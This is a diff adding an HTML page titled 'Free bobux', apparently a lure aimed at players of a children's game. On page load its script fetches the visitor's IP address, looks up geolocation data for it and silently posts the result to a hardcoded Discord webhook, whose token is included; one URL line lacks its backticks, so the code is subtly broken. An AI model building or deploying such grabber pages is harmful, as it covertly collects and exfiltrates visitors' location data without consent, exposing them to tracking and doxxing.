@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free bobux</title>
+  <style>
+    body {
+      background-color: #252525;
+    }
+    #frame {
+      width: 500px;
+      height: 400px;
+      margin: 0 auto;
+      overflow: auto;
+      background-color: black;
+      padding: 20px;
+    }
+    #frame p {
+      color: white;
+    }
+    #response {
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <h1>Welcome to My Logger!</h1>
+  <p>Your ip is: <span id="ipv4"></span></p>
+  <div id="frame">
+    <p>Ty:</p>
+    <pre id="response"></pre>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script>
+    fetch('https://api.ipify.org/?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ipv4 = data.ip;
+        document.getElementById("ipv4").textContent = ipv4;
+
+        const apiUrl = http://ip-api.com/json/${ipv4};
+        fetch(apiUrl)
+          .then(response => response.json())
+          .then(apiData => {
+            document.getElementById("response").textContent = JSON.stringify(apiData, null, 2);
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1251240387323101236/e2FgswCvC7Itu-EZDtwm7vYKzQAPCGH6QpaywIa_tno59Lqy8jJ_eo3g8vkNq2cPEMDD';
+            const discordData = {
+              content: JSON.stringify(apiData, null, 2),
+              username: 'actully fucked by target',
+              avatar_url: 'https://cdn.britannica.com/50/11350-004-678A25EF/species-guenon.jpg'
+            };
+            axios.post(webhookUrl, discordData)
+              .then(() => {
+              })
+              .catch(error => {
+              });
+          })
+          .catch(error => {
+            console.log(error);
+            document.getElementById("response").textContent = "Unable to retrieve API response.";
+          });
+      })
+      .catch(error => {
+        console.log(error);
+        document.getElementById("ipv4").textContent = "Unable to retrieve ip address.";
+      });
+  </script>
+</body>
+</html>
